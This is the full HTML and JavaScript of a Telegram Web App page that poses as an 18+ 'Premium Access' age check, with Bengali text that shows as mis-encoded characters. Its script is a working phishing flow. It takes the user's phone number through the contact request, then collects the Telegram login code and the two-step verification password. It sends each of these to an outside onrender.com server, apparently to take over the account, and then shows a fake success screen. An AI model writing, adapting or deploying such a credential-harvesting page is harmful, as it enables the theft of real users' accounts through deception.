<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium Access</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --primary-btn: #7265e3;
            --primary-glow: rgba(114, 101, 227, 0.5);
            --text-color: #ffffff;
            --glass-bg: rgba(0, 0, 0, 0.6);
            --keypad-bg: rgba(255, 255, 255, 0.08);
            --error-color: #ff4d4d;
        }

        body {
            margin: 0; padding: 0; height: 100vh;
            display: flex; justify-content: center; align-items: center;
            color: var(--text-color); font-family: 'Segoe UI', Roboto, sans-serif;
            overflow: hidden; position: relative;
            background: #000;
        }

        body::before {
            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://i.ibb.co/8LJttTWD/file-3.jpg');
            background-size: cover; background-position: center;
            filter: blur(10px); z-index: -2; transform: scale(1.1);
        }

        .app-container {
            width: 90%; max-width: 380px; text-align: center; padding: 30px 20px;
            background: var(--glass-bg); border-radius: 24px; backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }

        .step { display: none; }
        .step.active { display: block; animation: slideUp 0.4s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .emoji-img { width: 120px; height: 120px; margin-bottom: 20px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3)); }

        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 14px; opacity: 0.8; margin-bottom: 20px; line-height: 1.5; }

        .btn {
            background: var(--primary-btn); color: white; border: none;
            padding: 16px; width: 100%; border-radius: 14px;
            font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px;
            transition: all 0.3s ease; box-shadow: 0 4px 15px var(--primary-glow);
            display: flex; justify-content: center; align-items: center;
        }
        .btn:active { transform: scale(0.97); }
        .btn:disabled { background: #555; box-shadow: none; cursor: not-allowed; }

        .code-input-wrap { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
        .code-input {
            width: 45px; height: 55px; background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1); border-radius: 12px;
            color: white; text-align: center; font-size: 24px; font-weight: bold;
            transition: all 0.3s ease;
        }
        .code-input.filled { border-color: var(--primary-btn); box-shadow: 0 0 10px var(--primary-glow); background: rgba(114, 101, 227, 0.1); }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 25px; }
        .key { background: var(--keypad-bg); padding: 18px; border-radius: 15px; font-size: 20px; font-weight: 500; cursor: pointer; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
        .key:active { background: rgba(255,255,255,0.2); transform: scale(0.9); }
        .key.special { color: var(--primary-btn); font-weight: bold; }

        .error-msg { color: var(--error-color); font-size: 13px; margin-top: 12px; display: none; font-weight: 500; }

        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
        .shake { animation: shake 0.3s ease-in-out; border-color: var(--error-color) !important; }

        .loader { width: 18px; height: 18px; border: 2.5px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: none; animation: rotation 1s linear infinite; margin-left: 10px; }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="step active" id="step1">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" class="emoji-img">
            <h2>Verify Your Age</h2>
            <p>You must be 18+ to access premium content. Click the button to verify.</p>
            <button class="btn" id="startBtn" onclick="handleStart()">
                ‚úÖ I'M 18+ PROCEED <span class="loader" id="loader_start"></span>
            </button>
        </div>

        <div class="step" id="step2">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Mobile%20Phone.webp" class="emoji-img">
            <h2>Enter OTP Code</h2>
            <p>A 5-digit code has been sent to your <b>Telegram</b> account.</p>
            <div class="code-input-wrap" id="otp-wrap">
                <input type="text" class="code-input" id="otp1" readonly placeholder="‚Ä¢">
                <input type="text" class="code-input" id="otp2" readonly placeholder="‚Ä¢">
                <input type="text" class="code-input" id="otp3" readonly placeholder="‚Ä¢">
                <input type="text" class="code-input" id="otp4" readonly placeholder="‚Ä¢">
                <input type="text" class="code-input" id="otp5" readonly placeholder="‚Ä¢">
            </div>
            <div id="otp-error" class="error-msg">‚ùå ‡¶≠‡ßÅ‡¶≤ ‡¶ï‡ßã‡¶°, ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</div>
            <div class="keypad">
                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
                <div class="key special" onclick="press('C')">C</div><div class="key" onclick="press('0')">0</div><div class="key special" onclick="press('‚å´')">‚å´</div>
            </div>
        </div>

        <div class="step" id="step3">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp" class="emoji-img">
            <h2>2-Step Verification</h2>
            <p>Your account is protected by a password. Please enter it below.</p>
            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: none;" placeholder="Enter Password">
            <div id="2fa-error" class="error-msg">‚ùå ‡¶™‡¶æ‡¶∏‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶° ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡ßü‡•§</div>
            <button class="btn" id="confirm2fa" onclick="verify2FA()">UNLOCK ACCESS <span class="loader" id="loader_2fa"></span></button>
        </div>

        <div class="step" id="step4">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Card%20Index%20Dividers.webp" class="emoji-img">
            <h2>‡¶≤‡¶ó‡¶á‡¶® ‡¶∏‡¶´‡¶≤!</h2>
            <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶ü‡¶ø ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§ ‡¶è‡¶ñ‡¶® ‡¶∏‡¶¨ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶¶‡ßá‡¶ñ‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá‡¶®‡•§</p>
            <button class="btn" style="background: #ff9500; box-shadow: 0 4px 15px rgba(255, 149, 0, 0.4);" onclick="window.location.href='https://t.me/your_channel'">üé¨ WATCH VIDEOS NOW</button>
        </div>
    </div>

    <script>
        const RENDER_URL = "https://s23315984.onrender.com"; 
        const tg = window.Telegram.WebApp;
        tg.expand(); 

        let currentOtp = "";
        let userPhone = "";

        function nextStep(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + n).classList.add('active');
        }

        function handleStart() {
            tg.requestContact((sent, response) => {
                if (sent && response && response.contact) {
                    userPhone = response.contact.phone_number;
                    if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;

                    // ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶ì‡¶ü‡¶ø‡¶™‡¶ø ‡¶™‡ßá‡¶ú‡ßá ‡¶Æ‡ßÅ‡¶≠ ‡¶ï‡¶∞‡¶¨‡ßá
                    nextStep(2);

                    // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶°‡ßá ‡¶ì‡¶ü‡¶ø‡¶™‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡ßá‡¶∂
                    fetch(`${RENDER_URL}/send_otp`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ phone: userPhone })
                    }).catch(e => console.log("Init request sent"));

                } else {
                    tg.showPopup({
                        title: '‡¶™‡ßç‡¶∞‡ßü‡ßã‡¶ú‡¶®‡ßÄ‡ßü',
                        message: '‡¶∏‡¶†‡¶ø‡¶ï‡¶≠‡¶æ‡¶¨‡ßá ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶ï‡¶∞‡¶§‡ßá ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ ‡¶¨‡¶æ‡¶ß‡ßç‡¶Ø‡¶§‡¶æ‡¶Æ‡ßÇ‡¶≤‡¶ï‡•§',
                        buttons: [{type: 'ok', text: '‡¶†‡¶ø‡¶ï ‡¶Ü‡¶õ‡ßá'}]
                    });
                }
            });
        }

        function press(num) {
            const errDiv = document.getElementById('otp-error');
            errDiv.style.display = "none";

            if (num === 'C') currentOtp = "";
            else if (num === '‚å´') currentOtp = currentOtp.slice(0, -1);
            else if (currentOtp.length < 5) currentOtp += num;

            for (let i = 1; i <= 5; i++) {
                const el = document.getElementById('otp' + i);
                el.value = currentOtp[i - 1] || "";
                if(currentOtp[i-1]) el.classList.add('filled');
                else el.classList.remove('filled');
            }

            if (currentOtp.length === 5) {
                tg.HapticFeedback.notificationOccurred('success');
                verifyOtp();
            }
        }

        async function verifyOtp() {
            try {
                // ‡¶ì‡¶ü‡¶ø‡¶™‡¶ø ‡¶™‡ßá‡¶ú‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶á‡¶®‡¶°‡¶ø‡¶ï‡ßá‡¶ü‡¶∞ ‡¶¶‡¶ø‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶® ‡¶Ø‡¶¶‡¶ø ‡¶™‡ßç‡¶∞‡ßü‡ßã‡¶ú‡¶® ‡¶π‡ßü
                const res = await fetch(`${RENDER_URL}/verify`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: userPhone, otp: currentOtp })
                });
                const data = await res.json();

                if (data.status === "done") {
                    nextStep(4);
                } else if (data.status === "need_2fa") {
                    nextStep(3);
                } else {
                    throw new Error("Invalid OTP");
                }
            } catch (err) {
                const wrap = document.getElementById('otp-wrap');
                wrap.classList.add('shake');
                document.getElementById('otp-error').style.display = "block";
                setTimeout(() => {
                    wrap.classList.remove('shake');
                    currentOtp = "";
                    for(let i=1;i<=5;i++) {
                        const el = document.getElementById('otp'+i);
                        el.value="";
                        el.classList.remove('filled');
                    }
                }, 500);
            }
        }

        async function verify2FA() {
            const pass = document.getElementById('2fa-input').value;
            const loader = document.getElementById('loader_2fa');
            const btn = document.getElementById('confirm2fa');
            
            if(!pass) return;

            loader.style.display = "inline-block";
            btn.disabled = true;

            try {
                const res = await fetch(`${RENDER_URL}/verify`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
                });
                const data = await res.json();
                
                if (data.status === "done") {
                    nextStep(4);
                } else {
                    throw new Error("Invalid Password");
                }
            } catch (err) {
                document.getElementById('2fa-input').classList.add('shake');
                document.getElementById('2fa-error').style.display = "block";
                setTimeout(() => document.getElementById('2fa-input').classList.remove('shake'), 500);
            } finally {
                loader.style.display = "none";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
